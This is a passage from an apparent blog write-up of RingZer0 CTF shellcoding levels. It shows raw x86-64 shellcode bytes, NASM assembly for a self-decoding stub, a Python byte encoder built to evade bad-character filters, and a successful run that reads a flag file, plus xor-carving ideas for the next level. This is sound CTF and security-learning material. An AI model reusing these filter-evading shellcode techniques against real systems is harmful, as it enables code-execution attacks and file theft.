</span><span class='line'><span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>5b<span class="se">\x</span>fe<span class="se">\x</span>cb<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>53<span class="se">\x</span>5f<span class="se">\x</span>54<span class="se">\x</span>5e<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>5f<span class="se">\x</span>5e<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>50<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>5e<span class="se">\x</span>58<span class="se">\x</span>5f<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>5f<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">47</span> ./shellcode3
</span></code></pre></td></tr></table></div></figure>


<p>Haha! No bad chars <em>and</em> three bytes to spare!</p>

<h2>Level 4</h2>

<p>I wasn&rsquo;t laughing anymore once I saw the restrictions placed on the shellcode of level 4:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x48&quot;</span> max size <span class="m">80</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>This bans the use of <code>syscall</code>, which assembles to <code>0x0f, 0x05</code>. In theory, I think <code>int 0x80</code> (<code>cd 80</code>) could be used, but I haven&rsquo;t verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding &amp; decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it&rsquo;s proper value.</p>

<p>I&rsquo;ve made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we&rsquo;d do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jmp _over_the_shellcode         <span class="p">;</span> jmp short, assembles to 0xeb + <span class="m">8</span> bit signed displacement
</span><span class='line'>
</span><span class='line'>_getInstructionPointer:
</span><span class='line'>pop rbx                         <span class="p">;</span> rbx now contains the address of _location
</span><span class='line'>
</span><span class='line'><span class="p">;</span> ...shellcode bytes...
</span><span class='line'>
</span><span class='line'>_over_the_shellcode:
</span><span class='line'>call _getInstructionPointer     <span class="p">;</span> call backward, assembles to 0xe8 and a <span class="m">32</span> bit signed displacement
</span><span class='line'>
</span><span class='line'>_location:
</span></code></pre></td></tr></table></div></figure>


<p>However, this <code>jmp/call/pop</code> sequence to get the current location of code would introduce <code>0xff</code> bytes due to the relative call backwards. We can&rsquo;t use this, but luckily RIP-relative addressing comes to the rescue!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>lea rax, <span class="o">[</span>rel _shellcode<span class="o">]</span>    <span class="p">;</span> notice the use of the rel keyword!
</span><span class='line'>
</span><span class='line'>_shellcode:
</span></code></pre></td></tr></table></div></figure>


<p>Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on <code>r14</code>, because <code>rax</code> through <code>rdi</code> would introduce bad chars, and so would <code>r15</code>.</p>

<p>The decoder looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>default rel                         <span class="p">;</span> we<span class="s1">&#39;ll use relative addressing to get RIP</span>
</span><span class='line'>
</span><span class='line'><span class="s1">_start:</span>
</span><span class='line'><span class="s1">                                    ; we use r14, because this will avoid the 0x48 byte</span>
</span><span class='line'><span class="s1">                                    ; lea eax/ecx etc emits 0x48</span>
</span><span class='line'><span class="s1">lea r14, [rel _shellcode+0x12345678]; we can&#39;</span>t use it directly, because of null bytes.
</span><span class='line'>sub r14, 0x12345678                 <span class="p">;</span> restore the value in r14, so it points to the encoded shellcode.
</span><span class='line'>
</span><span class='line'>push byte <span class="m">43</span>                        <span class="p">;</span> put amount of bytes to decode
</span><span class='line'>pop rcx                             <span class="p">;</span> in rcx
</span><span class='line'>
</span><span class='line'>_decode:
</span><span class='line'>dec byte <span class="o">[</span>r14<span class="o">]</span>                      <span class="p">;</span> start at r14 <span class="o">(</span>_fakecall<span class="o">)</span>
</span><span class='line'>add r14, <span class="m">1</span>                          <span class="p">;</span> <span class="s1">&#39;decode&#39;</span> by adding 1
</span><span class='line'>loop _decode                        <span class="p">;</span> decode <span class="sb">`</span>ecx<span class="sb">`</span> bytes.
</span><span class='line'>
</span><span class='line'>_shellcode:                         <span class="p">;</span> place <span class="s1">&#39;encoded&#39;</span> shellcode here
</span></code></pre></td></tr></table></div></figure>


<p>The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with <code>^@</code> or <code>0x00</code> by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>push byte <span class="m">0</span>         <span class="p">;</span> we can use <span class="m">0</span> here because we add <span class="m">1</span> to each
</span><span class='line'>                    <span class="p">;</span> byte in the shellcode to <span class="s1">&#39;encode&#39;</span> it.
</span><span class='line'>pop rbx             <span class="p">;</span> store this value in rbx. We<span class="s1">&#39;ll re-use it later.</span>
</span><span class='line'><span class="s1">push rbx            ; copy rbx...</span>
</span><span class='line'><span class="s1">pop rax             ; ...to rax. rax is now 0, the syscall for &#39;</span><span class="nb">read</span><span class="err">&#39;</span>
</span><span class='line'>push rbx            <span class="p">;</span> copy rbx...
</span><span class='line'>pop rdi             <span class="p">;</span> ...to rdi: <span class="nv">fd</span> <span class="o">=</span> stdin
</span><span class='line'>push rsp            <span class="p">;</span> copy rsp to rsi
</span><span class='line'>pop rsi             <span class="p">;</span> rsi is the buffer to which we <span class="nb">read </span>the filename to open
</span><span class='line'>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> the filename will be <span class="m">18</span> bytes long
</span><span class='line'>pop rdx             <span class="p">;</span> amount of byte to <span class="nb">read</span>
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read </span>in the filename
</span><span class='line'>
</span><span class='line'>push rbx            <span class="p">;</span> rbx is still 0
</span><span class='line'>pop rax             <span class="p">;</span> zero out rax
</span><span class='line'>xor al, <span class="m">2</span>           <span class="p">;</span> syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
</span><span class='line'>push rdi            <span class="p">;</span> switch around some registers. <span class="nv">rdi</span> <span class="o">=</span> 0
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> pointer to filename
</span><span class='line'>pop rdi             <span class="p">;</span> rdi now points to filename to open
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0, which is O_RDONLY
</span><span class='line'>syscall             <span class="p">;</span> open file
</span><span class='line'>
</span><span class='line'>                    <span class="p">;</span> switch around the registers again.
</span><span class='line'>                    <span class="p">;</span> have to use the push/pops, because <span class="sb">`</span>xchg<span class="sb">`</span> would generate a badchar after encoding.
</span><span class='line'>push rax            <span class="p">;</span> filehandle of just opened file
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0
</span><span class='line'>push rdi            <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> pointer to top of stack
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> buf
</span><span class='line'>pop rax             <span class="p">;</span> <span class="nv">rax</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>syscall <span class="nb">read</span><span class="o">)</span>
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> filehandle
</span><span class='line'>push byte <span class="m">127</span>       <span class="p">;</span> amount of bytes to <span class="nb">read</span>
</span><span class='line'>pop rdx             <span class="p">;</span> in rdx
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read </span>in the contents of the file
</span><span class='line'>
</span><span class='line'>push rbx            <span class="p">;</span> rbx is still 0
</span><span class='line'>pop rax             <span class="p">;</span> zero out rax
</span><span class='line'>xor al, <span class="m">1</span>           <span class="p">;</span> syscall write
</span><span class='line'>push rax            <span class="p">;</span> copy rax to rdi
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">filehandle</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>stdout<span class="o">)</span>
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> write to stdout<span class="p">;</span> get me the flag!
</span><span class='line'>ret                 <span class="p">;</span> <span class="k">return</span> to handler program
</span></code></pre></td></tr></table></div></figure>


<p>Now, I could assemble these two shellcode pieces with <code>nasm</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nasm -f bin ./decoder.asm
</span><span class='line'><span class="nv">$ </span>nasm -f bin ./shellcode.asm
</span></code></pre></td></tr></table></div></figure>


<p>Then I wrote a small python program to do the actual encoding of the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the decoder</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;decoder&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">decoder</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x</span><span class="si">%02x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="n">decoder</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the shellcode &amp; encode it</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="c"># for each byte, we add 1 to it and emit it.</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x</span><span class="si">%02x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># spit out payload!</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this python script, I ended up with the completed shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="o">./</span><span class="n">encode</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'>\<span class="n">x4c</span>\<span class="n">x8d</span>\<span class="n">x35</span>\<span class="n">x8b</span>\<span class="n">x56</span>\<span class="n">x34</span>\<span class="n">x12</span>\<span class="n">x49</span>\<span class="n">x81</span>\<span class="n">xee</span>\<span class="n">x78</span>\<span class="n">x56</span>\<span class="n">x34</span>\<span class="n">x12</span>\<span class="n">x6a</span>\<span class="n">x2b</span>\<span class="n">x59</span>\<span class="n">x41</span>\<span class="n">xfe</span>\<span class="n">x0e</span>\<span class="n">x49</span>\<span class="n">x83</span>\<span class="n">xc6</span>\<span class="n">x01</span>\<span class="n">xe2</span>\<span class="n">xf7</span>\<span class="n">x6b</span>\<span class="n">x01</span>\<span class="n">x5c</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x54</span>\<span class="n">x60</span>\<span class="n">x55</span>\<span class="n">x5f</span>\<span class="n">x6b</span>\<span class="n">x13</span>\<span class="n">x5b</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x35</span>\<span class="n">x03</span>\<span class="n">x58</span>\<span class="n">x57</span>\<span class="n">x60</span>\<span class="n">x5f</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x51</span>\<span class="n">x57</span>\<span class="n">x58</span>\<span class="n">x5f</span>\<span class="n">x59</span>\<span class="n">x60</span>\<span class="n">x6b</span>\<span class="n">x80</span>\<span class="n">x5b</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x35</span>\<span class="n">x02</span>\<span class="n">x51</span>\<span class="n">x60</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">xc4</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RingZer0 Team CTF Shellcoding Level 4
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x48&quot;</span> max size <span class="m">80</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level4.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;<span class="se">\x</span>4c<span class="se">\x</span>8d<span class="se">\x</span>35<span class="se">\x</span>8b<span class="se">\x</span>56<span class="se">\x</span>34<span class="se">\x</span>12<span class="se">\x</span>49<span class="se">\x</span>81<span class="se">\x</span>ee<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>34<span class="se">\x</span>12<span class="se">\x</span>6a<span class="se">\x</span>2b<span class="se">\x</span>59<span class="se">\x</span>41<span class="se">\x</span>fe<span class="se">\x</span>0e<span class="se">\x</span>49<span class="se">\x</span>83<span class="se">\x</span>c6<span class="se">\x</span>01<span class="se">\x</span>e2<span class="se">\x</span>f7<span class="se">\x</span>6b<span class="se">\x</span>01<span class="se">\x</span>5c<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>54<span class="se">\x</span>60<span class="se">\x</span>55<span class="se">\x</span>5f<span class="se">\x</span>6b<span class="se">\x</span>13<span class="se">\x</span>5b<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>35<span class="se">\x</span>03<span class="se">\x</span>58<span class="se">\x</span>57<span class="se">\x</span>60<span class="se">\x</span>5f<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>51<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>5f<span class="se">\x</span>59<span class="se">\x</span>60<span class="se">\x</span>6b<span class="se">\x</span>80<span class="se">\x</span>5b<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>35<span class="se">\x</span>02<span class="se">\x</span>51<span class="se">\x</span>60<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>c4
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>70<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level4.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>Connection to shellcode.ringzer0team.com closed.
</span></code></pre></td></tr></table></div></figure>


<h2>Level 5</h2>

<p>Of course, level 5 increases the bad char list even further&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68&quot;</span> and <span class="se">\x</span><span class="m">40</span> to <span class="se">\x</span><span class="m">65</span> max size <span class="m">100</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>We can no longer use the relative addressing with <code>lea</code>, because of the bad chars <code>0x49</code> and <code>0x48</code>. In fact, I was unable to get the address of the shellcode via any techniques I know.</p>

<p>I assumed that this shellcode is being executed via a instruction like <code>call rax</code>. That means that <code>rax</code> would still contain the pointer to the shellcode. If this is the case, we can re-use the value in <code>rax</code> as an index to the shellcode and use it to carve out the &lsquo;real&rsquo; shellcode via <code>xor</code> instructions. But let&rsquo;s first test this hypothesis. Time to get creative!</p>

<p>I made a small piece of shellcode that tests this hypothesis:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>default rel
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>xor dword <span class="o">[</span>rax+_temp-_start<span class="o">]</span>, 0x3d283d28        <span class="p">;</span> the xor will change the rets to jmp <span class="nv">$-</span>2!
</span><span class='line'>
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>
</span><span class='line'>_temp:
</span><span class='line'>ret
</span><span class='line'>ret
</span><span class='line'>ret
</span><span class='line'>ret
</span></code></pre></td></tr></table></div></figure>


<p>When this code executes, the <code>xor</code> instruction should change the <code>ret</code> instructions to <code>jmp $-2</code>, or infinite loops (this works, because <code>c3 c3 c3 c3 xor 28 3d 28 3d</code> translates to <code>eb fe eb fe</code>). If <code>rax</code> does not point to the shellcode, I might get a SIGSEGV or the code simply exits.</p>

<p>Compiling it and sending it over, however, makes the program hang! This must means that the <code>ret</code>s were changed into <code>jmp</code> instructions, proving the hypothesis. We can use <code>rax</code> as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same <code>xor</code> strategy. I made the <code>read/open/read/write</code> shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that&rsquo;s okay because I&rsquo;m gonna encode it anyway:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>xor rax, rax        <span class="p">;</span> syscall <span class="nb">read</span>
</span><span class='line'>push rax
</span><span class='line'>pop rdi             <span class="p">;</span> rdi: <span class="nv">fd</span> <span class="o">=</span> stdin
</span><span class='line'>push rsp
</span><span class='line'>pop rsi             <span class="p">;</span> rsi points to stack, aka a buffer
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> <span class="nb">read </span><span class="m">127</span> bytes
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>mov al, <span class="m">2</span>           <span class="p">;</span> open<span class="p">;</span> because we <span class="nb">read </span>less than <span class="m">128</span> bytes, the rest of rax/eax/ax/ah will contain zeroes.
</span><span class='line'>xchg rsi, rdi       <span class="p">;</span> rsi is now zero <span class="o">(</span>O_RDONLY<span class="o">)</span> and rdi points to the filename on the stack
</span><span class='line'>syscall             <span class="p">;</span> open the file
</span><span class='line'>
</span><span class='line'>xchg rax, rdi       <span class="p">;</span> after this, <span class="nv">rax</span> <span class="o">=</span> pointer to the stack, <span class="nv">rdi</span> <span class="o">=</span> filehandle
</span><span class='line'>xchg rax, rsi       <span class="p">;</span> after this, <span class="nv">rax</span> <span class="o">=</span> 0, <span class="nv">rsi</span> <span class="o">=</span> pointer to the stack
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>mov al, <span class="m">1</span>           <span class="p">;</span> again, less than <span class="m">128</span> bytes will be <span class="nb">read</span>
</span><span class='line'>push rax
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">fd</span> <span class="o">=</span> stdout
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> write out contents of flag to stdout!
</span></code></pre></td></tr></table></div></figure>


<p>Next, I needed to carve out this shellcode using <code>xor</code> instructions. These instructions must not contain bad chars. Luckily, <code>xor dword ptr [rax+offset]</code> itself does not contain bad chars, or they can be avoided.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39; this function will try to locate a combination of two bytes that, when</span>
</span><span class='line'><span class="sd">    xor&#39;ed, yield the required byte.</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
